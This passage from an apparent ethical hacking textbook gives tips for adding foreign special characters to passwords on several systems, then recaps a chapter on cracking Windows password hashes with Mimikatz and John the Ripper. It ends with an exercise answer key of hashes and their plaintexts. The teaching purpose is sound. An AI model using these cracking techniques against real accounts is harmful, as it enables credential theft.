				In addition to the regular keyboard special characters like <em>!</em>, <em>@</em>, <em>#</em>, and <em>$</em>, you can add a special character from a language or alphabet different from your own. Even if you use a shorter password instead of a passphrase, adding a special character from another language can make it much harder to crack.</p>
			<p>Let’s look at how to do this in different operating systems.</p>
			<ol class="none">
				<li><span class="RunInHead">Windows</span>  Hold down the <span class="KeyCaps">ALT</span> key while typing numbers on the numeric keypad and then release it. For example, hold down the <span class="KeyCaps">ALT</span> key while typing 0214 on your numeric keypad; when you release the <span class="KeyCaps">alt</span> key, the character <code>Ö</code> will appear (a capital <em>O</em> with an umlaut). Search online for a list of “Windows alt codes” to find a character you want to use. Note that some keyboards may require you to use the left <span class="KeyCaps">ALT</span> key specifically. On a laptop without a numeric keypad, you can press the Windows key plus the period key (<span class="KeyCaps">Windows</span>-.) to insert an emoji or other symbol.</li>
				<li><span class="RunInHead">Linux</span>  Press <span class="KeyCaps">ctrl-shift-</span>U; release (you’ll see an underlined <em>u</em> onscreen); enter the Unicode hexadecimal value for the character you want, like <code>d6</code> (or <code>00d6</code> for systems that require four digits) for the <code>Ö</code> character, and then press the spacebar or <span class="KeyCaps">enter</span>. Search online for “Unicode character codes” to find more options.</li>
				<li><span class="RunInHead">macOS</span>  Press <span class="KeyCaps">CONTROL</span>-<span class="KeyCaps">COMMAND</span>-<span class="KeyCaps">SPACEBAR</span> to bring up the Character Viewer. Enter <code>u+d6</code> to show the <code>Ö</code> character. To insert the character, either press the down arrow to select it and then press <span class="KeyCaps">ENTER</span> or simply click it with your mouse. The same Unicode character codes that work for Linux will work on macOS in the Character Viewer; just add <code>u+</code> before the hexadecimal code.</li>
				<li><span class="RunInHead">iPhone or Android</span>  Press and hold the O on the virtual keyboard until a pop-up appears with the <code>Ö</code> character and other options. You can’t access all Unicode characters without installing an app or choosing an alternate keyboard layout, but a long press on most vowels and a few consonants will give you enough options to make your password stronger.</li>
			</ol>
			<p>
				Of course, you might not remember more than one or two long passwords with special characters like this. A password manager can lessen the burden by setting long, random passwords for most of your accounts and safely storing them for you. Additionally, you should turn on two-factor authentication whenever it’s offered. With this feature, even if an attacker cracks one of your passwords, they may not be able to gain access to your account. We’ll look more closely at these tools in <span class="xref" itemid="xref_target_Chapter 11">Chapter 11</span>.</p>
			<h2 id="h1-502000c07-0005"><span epub:type="pagebreak" id="Page_89" title="89"/>The Takeaway</h2>
			<p class="BodyFirst">In this chapter, you learned how attackers steal Windows password hashes over the web using Mimikatz in Metasploit. Once an attacker has access to your computer through malware they’ve tricked you into installing, they can (and often do) look around your system for passwords or other sensitive data. Then you saw how hackers can easily crack many password hashes with a free online password database or a dictionary attack in John the Ripper. You also learned how to crack more complex passwords using a mask attack by adding a few wildcard characters to an old or incomplete password.</p>
			<p>Finally, you learned some techniques to keep yourself safe from the password hacks covered in this chapter. Here’s a short summary of dos and don’ts that can change your password habits for life:</p>
			<ul>
				<li><em>Don’t</em> use the same password across multiple accounts.</li>
				<li><em>Don’t</em> reuse a password by adding numbers or symbols to the end (or middle or beginning).</li>
				<li><em>Don’t </em>write passwords down or store them in plaintext documents or spreadsheets.</li>
				<li><em>Do </em>use long passphrases with one or more special characters.</li>
				<li><em>Do</em> use a password manager and multifactor authentication.</li>
			</ul>
			<p>
				These tips will make your online life easier and <em>much</em> more secure than the average person’s. However, an attacker doesn’t have to access your computer to steal your password; they can steal passwords and other information from web applications and servers over the internet. In the next chapter, we’ll learn how by hacking into a vulnerable web server in our virtual lab.</p>
			<p>
				First, though, check <a href="#listing7-2">Listing 7-2</a> to see if you successfully cracked the passwords from the beginning of the chapter!</p>
			<pre><code>359878442cf617606802105e2f439dbc Wow!
63191e4ece37523c9fe6bb62a5e64d45 Great
9dddd5ce1b1375bc497feeb871842d4b job
4d1f35512954cb227b25bbd92e15bc7b cracking
e6071c75ea19bef227b49e5e304eb2f1 passwords!</code></pre>
			<p class="CodeListingCaption"><a id="listing7-2">Listing 7-2</a>: Cracked passwords from <span class="xref" itemid="xref_target_Listing 7-1"><a href="#listing7-1">Listing 7-1</a></span></p>
		</section>
	</body>
</html>